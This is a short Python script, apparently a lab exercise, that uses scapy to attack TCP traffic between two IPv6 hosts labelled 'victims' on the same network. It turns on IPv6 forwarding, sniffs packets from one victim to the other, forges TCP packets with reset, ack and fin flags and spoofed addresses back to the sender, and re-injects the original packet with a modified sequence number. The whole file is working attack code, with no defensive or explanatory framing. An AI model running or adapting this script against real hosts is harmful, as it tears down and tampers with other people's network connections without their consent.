import os
os.environ['http_proxy'] = ''
from scapy.all import *

#ip_vitima01 = "2001:db8:0:1:d1:89ec:891:eba3"
#ip_vitima02 = "2001:1bcd:123:1:4c75:483:eb42:ba9c"

ip_vitima01 = "2001:db8:0:1:d1:89ec:891:eba3"
ip_vitima02 = "2001:db8:0:1:acc3:a921:762c:d319"

mac_atacante = "a4:1f:72:f5:90:50"

os.system('echo 1 > /proc/sys/net/ipv6/conf/all/forwarding')



def pkgs(pkg):
	pkg.show()
	print('\n\n\n\n')

	resp_eth = Ether(dst=pkg.src, src=pkg.dst)
	resp_ipv6 = IPv6(dst=pkg[IPv6].src, src=pkg[IPv6].dst)
	resp_tcp = TCP(dport=pkg[IPv6][TCP].sport, sport=pkg[IPv6][TCP].dport, flags="RAF", seq=pkg[IPv6][TCP].ack, ack=pkg[IPv6][TCP].seq + (len(pkg[IPv6][TCP].payload) if pkg.getlayer(Raw) else 1))

	resp = resp_eth / resp_ipv6 / resp_tcp

	resp.show2()
	print('\n\n\n\n')

	sendp(resp,verbose=5, iface = 'enp4s0')

	resp = pkg
	resp[TCP].seq += 1
	#resp.remove_payload()

	resp.show2()
	print('\n\n\n\n')

	sendp(resp,verbose=5, iface = 'enp4s0')

def isMyPacket (pkt):
	return IPv6 in pkt and TCP in pkt[IPv6] and pkt[IPv6].src == ip_vitima01 and pkt[IPv6].dst == ip_vitima02
	#return IPv6 in pkt and pkt[IPv6].src in [ip_vitima01, ip_vitima02] and pkt[IPv6].dst in [ip_vitima01, ip_vitima02] and TCP in pkt[IPv6]

if __name__=="__main__":
	#conf.L3socket=L3RawSocket  NUNCA MAIS DESCOMENTAR. JAMAIS!!!!
	sniff(lfilter=isMyPacket,iface="enp4s0",prn=pkgs,store=0)
